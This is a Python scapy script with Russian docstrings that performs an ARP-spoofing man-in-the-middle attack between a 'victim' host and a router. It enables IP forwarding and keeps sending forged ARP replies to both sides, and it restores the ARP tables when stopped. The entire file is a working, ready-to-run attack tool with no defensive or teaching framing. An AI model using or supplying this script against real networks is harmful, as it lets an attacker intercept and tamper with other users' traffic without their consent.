#!/usr/bin/env python3
import scapy.all as scapy
import time
import sys
import argparse
import subprocess

def routing_enable():
    '''
    DOCSTRING: Включить передачу данных как у роутера
    INPUT: Нет
    OUTPUT: Нет
    '''
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

def routing_disable():
    '''
    DOCSTRING: Выключить передачу данных как у роутера
    INPUT: Нет
    OUTPUT: Нет
    '''
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)

def get_ips():
    '''
    DOCSTRING: Получить ip-адреса жертвы и роутера при запуске скрипта
    INPUT: Нет
    OUTPUT: ip-адреса жертвы и роутера [arg]
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="[-] Target's ip-address")
    parser.add_argument("-r", "--router", dest="router", help="[-] Router's ip-address")
    arg = parser.parse_args()
    if not arg.target:
        parser.error("[-] Target's ip address required")
    if not arg.router:
        parser.error("[-] Target's ip address required")
    return arg

def get_mac_address(ip):
    '''
    DOCSTRING: Получить mac_address по логическому сетевому адресу
    INPUT: ip-адрес
    OUTPUT: MAC-адрес устройства
    '''
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_req_b = broadcast/arp_req
    answered_list = scapy.srp(arp_req_b, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    '''
    DOCSTRING: Спуффинг пакетов между жертвой и роутером
    INPUT: IP-адреса жертвы и роутера
    OUTPUT: Нет
    '''
    mac_address = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_address, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dst_ip, src_ip):
    '''
    DOCSTRING: Восстановить прежние mac-адреса
    INPUT: IP-адрес назначения, IP-адрес источника
    OUTPUT: Нет
    '''
    dst_mac_address=get_mac_address(dst_ip)
    src_mac_address=get_mac_address(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac_address, psrc=src_ip, hwsrc=src_mac_address)
    scapy.send(packet, count=4, verbose=False)

routing_enable()
args = get_ips()
target_ip = args.target
router_ip = args.router
packets_amount = 0

try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        packets_amount+=2
        print("\r[+] Packets sent: ", str(packets_amount), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Program has been stopped, ARP tables will be reseted\n")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    routing_disable()

except IndexError:
    print("\n[+] Something went wrong...\n")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    routing_disable()
